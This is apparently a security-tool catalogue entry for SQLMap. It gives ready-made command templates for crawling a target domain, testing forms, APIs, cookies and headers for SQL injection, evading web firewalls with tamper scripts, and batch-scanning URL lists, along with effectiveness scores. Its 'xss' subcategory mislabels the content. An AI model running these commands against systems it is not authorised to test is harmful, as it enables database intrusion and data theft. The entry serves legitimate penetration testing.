---
id: "sqlmap-crawl"
title: "SQLMap - Automated SQL Injection Testing"
type: "tool"
category: "web-application"
subcategory: "xss"
tags: ["vuln", "sqlmap-crawl", "injection", "database-detection", "injection-testing", "data-extraction"]
difficulty: "beginner"
platforms: ["linux", "macos"]
source_url: "https://sqlmap.org/"
related: []
updated: "2026-03-30"
---

## Overview

Advanced SQL injection detection and exploitation tool with database fingerprinting.

## Command Reference

```bash
sqlmap -u https://{domain} --crawl=2 --batch --random-agent --level=2 --risk=2 --output-dir={domain}_sqlmap_results
echo "[+] SQLMap: SQL injection testing completed"
```

## Features

- Database detection
- Injection testing
- Data extraction

## Documentation

- [Official Documentation](https://sqlmap.org/)

## Effectiveness Scores

| Target Type | Score | Notes |
|-------------|-------|-------|
| Web App | 0.90 | Best automated SQLi tool |
| API | 0.85 | Works with JSON/XML APIs |
| Network | 0.10 | Not applicable to network targets |
| Cloud | 0.30 | Limited cloud-specific use |
| CMS | 0.85 | Good against CMS database layers |

## Fallback Alternatives

If sqlmap is unavailable: `ghauri` → `nosqlmap` (for NoSQL) → manual injection testing

## Context-Aware Parameters

```bash
# Standard web form testing
sqlmap -u "https://{domain}/page?id=1" --batch --level 2 --risk 2 --random-agent

# API endpoint (JSON body)
sqlmap -u "https://{domain}/api/search" --data='{"query":"test"}' --content-type=application/json --batch --level 2 --risk 2

# Deep scan with WAF bypass
sqlmap -u "https://{domain}/page?id=1" --batch --level 5 --risk 3 --tamper=space2comment,between,randomcase --random-agent --delay=2

# PHP/MySQL target
sqlmap -u "https://{domain}/page?id=1" --batch --dbms=mysql --technique=BEUST --tamper=space2mysqlblank

# ASP.NET/MSSQL target
sqlmap -u "https://{domain}/page?id=1" --batch --dbms=mssql --os=windows --tamper=space2mssqlblank,between

# Multiple URLs from file
sqlmap -m urls_with_params.txt --batch --level 2 --risk 2 --random-agent --output-dir=sqli_results/

# Cookie-based injection
sqlmap -u "https://{domain}/dashboard" --cookie="session=abc123" --level 3 --batch

# Header-based injection
sqlmap -u "https://{domain}/" --headers="X-Forwarded-For: 1*\nReferer: 1*" --batch --level 3
```
